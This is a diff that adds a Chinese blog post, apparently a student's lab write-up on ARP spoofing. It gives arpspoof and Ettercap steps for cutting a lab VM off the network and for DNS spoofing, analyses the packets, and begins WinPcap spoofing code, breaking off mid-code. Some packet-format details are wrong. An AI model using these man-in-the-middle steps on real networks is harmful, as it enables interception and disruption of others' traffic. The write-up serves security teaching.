@@ -1,0 +1,736 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"leeyuxun.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":true,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"./public/search.xml"};
+  </script>
+
+  <meta name="description" content="实验内容 运行Ettercap，扫描在线主机，对目标主机进行禁止上网、DNS欺骗攻击，查看目标主机状态。 通过WireShark抓包工具，捕获ARP欺骗攻击的数据包，分析ARP攻击的原理。 基于Winpcap编写程序，对指定的目标IP地址进行ARP欺骗攻击。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ARP欺骗实验">
+<meta property="og:url" content="https://leeyuxun.github.io/ARP%E6%AC%BA%E9%AA%97%E5%AE%9E%E9%AA%8C.html">
+<meta property="og:site_name" content="Leeyuxun の note">
+<meta property="og:description" content="实验内容 运行Ettercap，扫描在线主机，对目标主机进行禁止上网、DNS欺骗攻击，查看目标主机状态。 通过WireShark抓包工具，捕获ARP欺骗攻击的数据包，分析ARP攻击的原理。 基于Winpcap编写程序，对指定的目标IP地址进行ARP欺骗攻击。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661105370.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661361464.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661161089.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661280293.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661290669.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661495435.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565666177653.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661553673.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661576848.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661632148.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661652172.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661688492.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661743998.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661839379.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661873307.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661925221.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661978661.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661988808.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565662157154.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565662324778.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565662344454.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565662364992.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565662370836.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565663142897.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565663099808.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565663229669.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565663291347.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565663338989.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565663408382.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565663414285.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664387481.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664404355.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664411960.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664449611.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664459530.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664524204.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664536161.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664544848.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664561633.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664628262.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664726685.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664731112.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664745324.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664753049.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664758887.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664793294.png">
+<meta property="og:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565664799061.png">
+<meta property="article:published_time" content="2019-08-13T01:43:04.000Z">
+<meta property="article:modified_time" content="2020-04-02T06:48:44.000Z">
+<meta property="article:author" content="李钰璕">
+<meta property="article:tag" content="ARP欺骗">
+<meta property="article:tag" content="winpcap">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661105370.png">
+
+<link rel="canonical" href="https://leeyuxun.github.io/ARP%E6%AC%BA%E9%AA%97%E5%AE%9E%E9%AA%8C.html">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>ARP欺骗实验 | Leeyuxun の note</title>
+  
+    <script>
+      function sendPageView() {
+        if (CONFIG.hostname !== location.hostname) return;
+        var uid = localStorage.getItem('uid') || (Math.random() + '.' + Math.random());
+        localStorage.setItem('uid', uid);
+        navigator.sendBeacon('https://www.google-analytics.com/collect', new URLSearchParams({
+          v  : 1,
+          tid: 'UA-163555158-1',
+          cid: uid,
+          t  : 'pageview',
+          dp : encodeURIComponent(location.pathname)
+        }));
+      }
+      document.addEventListener('pjax:complete', sendPageView);
+      sendPageView();
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Leeyuxun の note</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">BUPT | SCSS</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-links">
+
+    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://leeyuxun.github.io/ARP%E6%AC%BA%E9%AA%97%E5%AE%9E%E9%AA%8C.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="李钰璕">
+      <meta itemprop="description" content="安全学习笔记">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leeyuxun の note">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ARP欺骗实验
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-08-13 09:43:04" itemprop="dateCreated datePublished" datetime="2019-08-13T09:43:04+08:00">2019-08-13</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-04-02 14:48:44" itemprop="dateModified" datetime="2020-04-02T14:48:44+08:00">2020-04-02</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C/" itemprop="url" rel="index"><span itemprop="name">网络安全实验</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><ol>
+<li>运行<code>Ettercap</code>，扫描在线主机，对目标主机进行<code>禁止上网</code>、<code>DNS欺骗</code>攻击，查看目标主机状态。</li>
+<li>通过<code>WireShark</code>抓包工具，捕获<code>ARP欺骗攻击</code>的数据包，分析<code>ARP攻击</code>的原理。</li>
+<li>基于<code>Winpcap</code>编写程序，对指定的目标IP地址进行<code>ARP欺骗攻击</code>。<span id="more"></span></li>
+</ol>
+<h1 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h1><h2 id="“禁止上网”攻击"><a href="#“禁止上网”攻击" class="headerlink" title="“禁止上网”攻击"></a>“禁止上网”攻击</h2><p>Kali攻击机利用<strong>arp欺骗后不进行IP转发</strong>对靶机CentOS进行“禁止上网”攻击</p>
+<ol>
+<li><p>打开两台虚拟机，利用命令ifconfig查看Kali的网络接口、ip等信息：Kali网络接口为<code>eth0</code>，IP地址为<code>192.168.88.130</code>。</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661105370.png" alt="1565661105370"></p>
+</li>
+<li><p>利用命令ifconfig和route查看CentOS的IP地址和网关：CentOS的IP地址为<code>192.168.88.131</code>，网关为<code>192.168.88.2</code>。</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661361464.png" alt="1565661361464"></p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661161089.png" alt="1565661161089"></p>
+</li>
+<li><p>攻击机利用Ettercap嗅探目标主机的IP地址和网关，网络接口选择eth0：嗅探到目标主机IP地址为<code>192.168.88.131</code>，网关为<code>192.168.88.2</code>，符合。</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661280293.png" alt="1565661280293"></p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661290669.png" alt="1565661290669"></p>
+</li>
+<li><p>利用命令行<code>echo 0 &gt; /proc/sys/net/ipv4/ip_forward</code>关闭Kali的IP转发，利用命令行<code>arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host</code>     即<code>arpspoof -i eth0</code><br><code>-c host -t 192.168.88.131 -r 192.168.88.2</code>得到靶机发送的消息。</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661495435.png" alt="1565661495435"></p>
+</li>
+<li><p>使用CentOS ping 百度网址<a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a>发现无法连接百度，不能上网。</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565666177653.png" alt="1565666177653"></p>
+</li>
+<li><p>利用Ctrl+C使Kali退出arp欺骗。</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661553673.png" alt="1565661553673"></p>
+</li>
+<li><p>使用CentOS ping 百度网址<a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a>发现没有丢包，可以上网。</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661576848.png" alt="1565661576848"></p>
+</li>
+</ol>
+<h2 id="“DNS欺骗”攻击"><a href="#“DNS欺骗”攻击" class="headerlink" title="“DNS欺骗”攻击"></a>“DNS欺骗”攻击</h2><ol>
+<li><p>利用命令<code>/etc/init.d/apache2 start</code>打开kali自带的Apache服务。</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661632148.png" alt="1565661632148"></p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661652172.png" alt="1565661652172"></p>
+</li>
+<li><p>对<code>etter.dns</code>文件进行修改如下：</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661688492.png" alt="1565661688492"></p>
+</li>
+<li><p>Kali利用<code>Ettercap</code>进行<code>Unified sniffing</code>嗅探网络接口选择<code>eth0</code>，并在<code>Hosts</code>下选择<code>Scan for hosts</code>，然后选择<code>Hosts list</code>列出主机。</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661743998.png" alt="1565661743998"></p>
+</li>
+<li><p>在<code>Mitm</code>中选择<code>Arp Poisoning</code>，勾选<code>Sniff remote connections</code>开启嗅探。</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661839379.png" alt="1565661839379"></p>
+</li>
+<li><p>在<code>Plugins</code>下打开<code>Manage the plugins</code>，将<code>dns_spoof</code>插件双击选中。</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661873307.png" alt="1565661873307"></p>
+</li>
+<li><p>选择CentOS的IP点击<code>Add to Target1</code>，接着选择CentOS的网关点击<code>Add to Target2</code>，然后点击<code>Start sniffing</code>，DNS欺骗完成。</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661925221.png" alt="1565661925221"></p>
+</li>
+<li><p>使用CentOS ping百度地址<a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a>,发现ping到的IP地址为<code>192.168.88.130</code>,即Kali的IP地址,使用浏览器输入淘宝域名<a target="_blank" rel="noopener" href="http://www.taobao.com/">www.taobao.com</a>,进入到Kali的<code>localhost页面</code>,表明DNS欺骗攻击成功。</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661978661.png" alt="1565661978661"></p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661988808.png" alt="1565661988808"></p>
+</li>
+<li><p>由于在修改etter.dns文件时只修改了*.com/<em>.rog/</em>.net,因此只能欺骗.com/.org/.net的域名，如可以正常访问<a href="www.leeyuxun.tk">www.leeyuxun.tk</a></p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565662157154.png" alt="1565662157154"></p>
+</li>
+</ol>
+<h2 id="分析ARP攻击原理"><a href="#分析ARP攻击原理" class="headerlink" title="分析ARP攻击原理"></a>分析ARP攻击原理</h2><p>在Kali通过Ettercap嗅探CentOS的同时,通过WireShark抓包工具，捕获ARP欺骗攻击的数据包，分析ARP攻击的原理。</p>
+<ol>
+<li><p>利用命令行<code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code>开启Kali的IP转发, 利用命令行<code>arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host</code> 即<code>arpspoof -i eth0 -c host -t 192.168.88.131 -r 192.168.88.2</code>作为靶机消息转发的中间人。</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565662324778.png" alt="1565662324778"></p>
+</li>
+<li><p>利用WireShark抓包工具抓取ARP包。</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565662344454.png" alt="1565662344454"></p>
+</li>
+<li><p>双击打开其中一条ARP报文,根据ARP报文格式分析如下。</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565662364992.png" alt="1565662364992"></p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565662370836.png" alt="1565662370836"></p>
+</li>
+<li><p>ARP报文是由14位的以太网首部和28位的ARP请求/应答构成：</p>
+<ul>
+<li>以太网首部如下<ul>
+<li>目标以太网地址(6字节): <code>00:50:56:ef:ad:4f</code></li>
+<li>源以太网地址(6字节): <code>00:0c:29:10:f5:75</code></li>
+<li>帧类型(2字节): <code>0x0806</code>,表示<code>ARP协议帧</code></li>
+</ul>
+</li>
+<li>ARP请求/应答如下<ul>
+<li>硬件类型(4字节): <code>Ethernet(1) / (0x0001)</code>, 表示<code>以太网</code></li>
+<li>协议类型(4字节): <code>IPv4 / (0x0080)</code>, 表示上层协议是<code>IPv4协议</code></li>
+<li>硬件地址长度(1字节): <code>6 / (0x06)</code>, 表示硬件(MAC)地址长度为6字节</li>
+<li>协议地址长度(1字节): <code>4 / (0x04)</code>, 表示协议地址长度为4字节,即<code>IPv4协议</code></li>
+<li>操作码: <code>reply(2) / (0x0002)</code>, <code>1</code>表示<code>ARP请求</code>, <code>2</code>表示<code>ARP</code>应答, <code>3</code>表示<code>RARP</code>请求,<code>4</code>表示<code>RARP</code>应答</li>
+<li>源硬件地址(6字节): <code>00:0c:29:10:f5:75</code>, 表示<code>发送方MAC地址</code></li>
+<li>源IP地址(4字节): <code>192.168.88.131 / (0xc0a85883)</code>, 表示<code>发送方IP地址</code></li>
+<li>目的硬件地址(6字节): <code>00:50:56:ef:ad:4f</code>, 表示<code>接收方MAC地址</code></li>
+<li>目的IP地址(4字节): <code>192.168.88.2 / (0xc0a85802)</code>, 表示<code>接收方IP地址</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>ARP攻击原理</p>
+<ol>
+<li>电脑A发送ARP请求,请求IP地址为<code>192.168.88.131</code>的电脑B的MAC地址；</li>
+<li>攻击者截获该请求并向电脑A发送一个伪造的ARP响应，告诉电脑A：IP地址为<code>192.168.88.130</code>的电脑B的MAC地址是<code>00:0c:29:01:f5:75</code> (攻击者的MAC地址)；</li>
+<li>电脑A将这个对应关系写入自己的ARP缓存表中，以后发送数据时，将本应该发往电脑B的数据发送给了攻击者；</li>
+<li>同样的，攻击者向电脑B也发送一个伪造的ARP响应，告诉电脑B：电脑A的IP地址<code>192.168.88.130</code>对应的MAC地址是<code>00:0c:29:01:f5:75</code>，电脑B也会将数据发送给攻击者。</li>
+</ol>
+</li>
+</ol>
+<h2 id="Winpacp实现ARP欺骗"><a href="#Winpacp实现ARP欺骗" class="headerlink" title="Winpacp实现ARP欺骗"></a>Winpacp实现ARP欺骗</h2><p>基于Winpcap编写程序，对指定的目标IP地址进行ARP欺骗攻击。</p>
+<h3 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h3><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565663142897.png" alt="1565663142897"></p>
+<h3 id="搭建编程环境"><a href="#搭建编程环境" class="headerlink" title="搭建编程环境"></a><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565663099808.png" alt="1565663099808">搭建编程环境</h3><ol>
+<li><p>下载安装<code>WinPcap运行库</code>，下载解压<code>WinPcap开发包</code>。</p>
+</li>
+<li><p>打开vs2017,新建<code>windows控制台应用程序</code>。</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565663229669.png" alt="1565663229669"></p>
+</li>
+<li><p>打开<code>项目属性-&gt;配置属性-&gt;c/c++-&gt;预处理器-&gt;预处理器定义</code>，在其中添加<code>WPCAP</code>、<code>HAVE_REMOTE</code>两个宏定义。</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565663291347.png" alt="1565663291347"></p>
+</li>
+<li><p>打开<code>项目属性-&gt;配置属性-&gt;链接器-&gt;输入-&gt;附加依赖项</code>添加<code>wpcap.lib</code>和<code>ws2_32.lib</code>两个库。</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565663338989.png" alt="1565663338989"></p>
+</li>
+<li><p>打开<code>项目属性-&gt;配置属性-&gt;VC++目录-&gt;包含目录</code>和同级的<code>库目录</code>分别添加之前下载解压的<code>WinPcap开发包</code>的<code>Include目录</code>和<code>Lib目录</code>路径。</p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565663408382.png" alt="1565663408382"></p>
+<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565663414285.png" alt="1565663414285"></p>
+</li>
+<li><p>调用相关的WinPcap库进行代码编写，设置Kali为靶机，查找攻击机，靶机和攻击机的IP地址、MAC地址（伪造地址是执行程序时输入的）。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 确定IP地址和MAC地址 */</span></span><br><span class="line">CONST	UCHAR	dst_mac[<span class="number">6</span>] = &#123; <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x29</span>, <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0x75</span> &#125;;	<span class="comment">//被攻击方的MAC</span></span><br><span class="line">CONST	UCHAR	gateway_mac[<span class="number">6</span>] = &#123; <span class="number">0x00</span>, <span class="number">0x50</span>, <span class="number">0x56</span>, <span class="number">0xEF</span>, <span class="number">0xAD</span>, <span class="number">0x4F</span> &#125;; <span class="comment">//网关的MAC</span></span><br><span class="line">CONST	UCHAR	src_mac[<span class="number">6</span>] = &#123; <span class="number">0xDE</span>, <span class="number">0x1A</span>, <span class="number">0x1A</span>, <span class="number">0xF3</span>, <span class="number">0x88</span>, <span class="number">0x83</span> &#125;;	<span class="comment">//攻击者的MAC</span></span><br><span class="line">CONST	CHAR	dst_ip[] = <span class="string">&quot;192.168.88.130&quot;</span>;	<span class="comment">//被攻击方IP</span></span><br><span class="line">CONST	CHAR	gateway_ip[] = <span class="string">&quot;192.168.88.2&quot;</span>;	<span class="comment">//网关IP </span></span><br><span class="line">		CHAR	forged_mac[<span class="number">6</span>] = &#123; <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span> &#125;;	<span class="comment">//伪造MAC</span></span><br><span class="line">		CHAR	forged_ip[] = <span class="string">&quot;0.0.0.0&quot;</span>;	<span class="comment">//伪造IP</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><ol>
+<li><p>构造ARP数据包</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 构造ARP包 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(1)		<span class="comment">//结构体字节长度是一的倍数，不可省略</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">__arp_packet</span> &#123;</span><br><span class="line">	UCHAR		ether_dhost[<span class="number">6</span>];				<span class="comment">//目标以太网地址 </span></span><br><span class="line">	UCHAR		ether_shost[<span class="number">6</span>];				<span class="comment">//源以太网地址 </span></span><br><span class="line">	USHORT		ether_type;					<span class="comment">//以太网类型</span></span><br><span class="line">	USHORT		hardware_type;				<span class="comment">//硬件类型</span></span><br><span class="line">	USHORT		protocol_type;				<span class="comment">//协议类型</span></span><br><span class="line">	USHORT		hardware_protocol_len;		<span class="comment">//硬件地址和协议地址长度第一个字节时硬件地址长度,第二个字节时协议地址长度</span></span><br><span class="line">	USHORT		opcode;						<span class="comment">//操作码</span></span><br><span class="line">	UCHAR		src_hrd_addr[<span class="number">6</span>];			<span class="comment">//源硬件地址</span></span><br><span class="line">	ULONG		src_ip;						<span class="comment">//源IP地址</span></span><br><span class="line">	UCHAR		dst_hrd_addr[<span 